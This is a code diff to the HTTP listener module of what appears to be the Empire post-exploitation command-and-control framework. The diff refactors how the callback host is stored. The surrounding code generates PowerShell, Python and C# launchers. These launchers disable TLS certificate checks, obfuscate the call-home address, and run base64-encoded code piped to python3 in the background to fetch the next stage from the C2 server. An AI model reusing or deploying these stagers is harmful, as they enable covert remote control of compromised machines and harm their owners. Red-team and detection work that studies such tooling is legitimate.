@@ -64,6 +64,7 @@ class Listener:
         # required:
         self.mainMenu = mainMenu
         self.thread = None
+        self.host_address = None
 
         self.instance_log = log
 
@@ -104,21 +105,14 @@ class Listener:
             log.error("listeners/template generate_launcher(): no language specified!")
             return None
 
-        active_listener = self
-        # extract the set options for this instantiated listener
-        listenerOptions = active_listener.options
-
-        host = listenerOptions["Host"]["Value"]
-        launcher = listenerOptions["Launcher"]["Value"]
-        stagingKey = listenerOptions["StagingKey"]["Value"]
-        profile = listenerOptions["DefaultProfile"]["Value"]
+        launcher = self.options["Launcher"]["Value"]
+        stagingKey = self.options["StagingKey"]["Value"]
+        profile = self.options["DefaultProfile"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         customHeaders = profile.split("|")[2:]
 
-        if language.startswith("po"):
-            # PowerShell
-
+        if language == "powershell":
             stager = '$ErrorActionPreference = "SilentlyContinue";'
             if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
@@ -130,11 +124,11 @@ class Listener:
             stager += "$wc=New-Object System.Net.WebClient;"
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
             stager += f"$u='{user_agent}';"
 
-            if "https" in host:
+            if "https" in self.host_address:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
@@ -174,14 +168,6 @@ class Listener:
 
             # TODO: reimplement stager retries?
             # check if we're using IPv6
-            listenerOptions = copy.deepcopy(listenerOptions)
-            bindIP = listenerOptions["BindIP"]["Value"]
-            port = listenerOptions["Port"]["Value"]
-            if ":" in bindIP and "http" in host:
-                if "https" in host:
-                    host = "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
-                else:
-                    host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
             # code to turn the key string into a byte array
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
@@ -198,7 +184,7 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
             # stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listener_name}';"
+            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
 
             # Add custom headers if any
             if customHeaders != []:
@@ -243,7 +229,7 @@ class Listener:
             # Python
 
             launcherBase = "import sys;"
-            if "https" in host:
+            if "https" in self.host_address:
                 # monkey patch ssl woohooo
                 launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
@@ -255,12 +241,12 @@ class Listener:
                 log.error(p, exc_info=True)
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
 
             launcherBase += "import urllib.request;\n"
             launcherBase += f"UA='{user_agent}';"
-            launcherBase += f"server='{host}';t='{stage0}';"
+            launcherBase += f"server='{self.host_address}';t='{stage0}';"
 
             # prebuild the request routing packet for the launcher
             routingPacket = packets.build_routing_packet(
@@ -292,7 +278,7 @@ class Listener:
                 if proxy.lower() == "default":
                     launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                 else:
-                    proto = proxy.Split(":")[0]
+                    proto = proxy.split(":")[0]
                     launcherBase += (
                         "proxy = urllib.request.ProxyHandler({'"
                         + proto
@@ -345,19 +331,19 @@ class Listener:
                 return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
             return launcherBase
 
-        if language.startswith("csh"):
-            workingHours = listenerOptions["WorkingHours"]["Value"]
-            killDate = listenerOptions["KillDate"]["Value"]
+        if language == "csharp":
+            workingHours = self.options["WorkingHours"]["Value"]
+            killDate = self.options["KillDate"]["Value"]
             customHeaders = profile.split("|")[2:]
-            delay = listenerOptions["DefaultDelay"]["Value"]
-            jitter = listenerOptions["DefaultJitter"]["Value"]
-            lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
+            delay = self.options["DefaultDelay"]["Value"]
+            jitter = self.options["DefaultJitter"]["Value"]
+            lostLimit = self.options["DefaultLostLimit"]["Value"]
 
             with open(self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb") as f:
                 stager_yaml = f.read()
             stager_yaml = stager_yaml.decode("UTF-8")
             stager_yaml = (
-                stager_yaml.replace("{{ REPLACE_ADDRESS }}", host)
+                stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
                 .replace("{{ REPLACE_SESSIONKEY }}", stagingKey)
                 .replace("{{ REPLACE_PROFILE }}", profile)
                 .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
@@ -426,10 +412,6 @@ class Listener:
                 "stage_2": stage2,
             }
             stager = template.render(template_options)
-
-            # make sure the server ends with "/"
-            if not host.endswith("/"):
-                host += "/"
 
             # Patch in custom Headers
             remove = []
@@ -604,8 +586,6 @@ class Listener:
 
         This should be implemented for the module.
         """
-        host = listenerOptions["Host"]["Value"]
-
         if not language:
             log.error("listeners/http generate_comms(): no language specified!")
             return None
@@ -621,7 +601,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
@@ -636,7 +616,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
@@ -776,25 +756,6 @@ class Listener:
                         tempOptions["ListenPort"]["Value"]
                     )
                     script += f" -FirewallName {session_id}"
-
-                    for option in self.options:
-                        if option.lower() == "host":
-                            if self.options[option]["Value"].startswith("https://"):
-                                host = "https://{}:{}".format(
-                                    tempOptions["internalIP"]["Value"],
-                                    tempOptions["ListenPort"]["Value"],
-                                )
-                                self.options[option]["Value"] = host
-                            else:
-                                host = "http://{}:{}".format(
-                                    tempOptions["internalIP"]["Value"],
-                                    tempOptions["ListenPort"]["Value"],
-                                )
-                                self.options[option]["Value"] = host
-
-                    # check to see if there was a host value at all
-                    if "Host" not in list(self.options.keys()):
-                        self.options["Host"]["Value"] = host
 
                     self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
 
